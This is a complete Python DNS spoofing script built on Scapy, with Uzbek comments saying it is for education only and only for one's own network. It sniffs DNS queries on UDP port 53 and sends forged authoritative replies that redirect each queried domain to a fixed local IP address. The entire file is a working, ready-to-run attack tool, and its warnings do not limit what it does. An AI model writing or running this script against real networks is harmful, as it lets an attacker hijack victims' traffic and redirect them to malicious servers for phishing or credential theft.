#!/usr/bin/env python3
"""
DNS Spoofing - FAQAT TA'LM UCHUN!
Faqat o'z tarmog'ingizda sinang!
Ruxsatsiz ishlatish JINOYAT!
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff

def dns_spoof(pkt):
    """
    DNS so'rovini tutib, yolg'on javob qaytarish
    
    ⚠️  FAFAQ O'Z TARMOG'INGIZDA SINANG!
    """
    if pkt.haslayer(DNSQR):
        domain = pkt[DNSQR].qname.decode()
        print(f"[*] DNS so'rov: {domain}")
        
        # Yolg'on IP (o'z serveringiz)
        spoofed_ip = "192.168.1.100"
        
        # DNS reply yaratish
        reply = IP(dst=pkt[IP].src) / \
                UDP(dport=pkt[UDP].sport, sport=53) / \
                DNS(
                    id=pkt[DNS].id,
                    qr=1,  # Reply
                    aa=1,  # Authoritative
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip)
                )
        
        send(reply, verbose=False)
        print(f"[*] Spoofed: {domain} → {spoofed_ip}")

if __name__ == "__main__":
    print("⚠️  DNS Spoofing boshlandi")
    print("⚠️  CTRL+C to'xtatish uchun\n")
    
    try:
        # DNS so'rovlarni ushlab turish
        sniff(filter="udp port 53", prn=dns_spoof, store=0)
    except KeyboardInterrupt:
        print("\n[*] DNS Spoofing to'xtatildi")
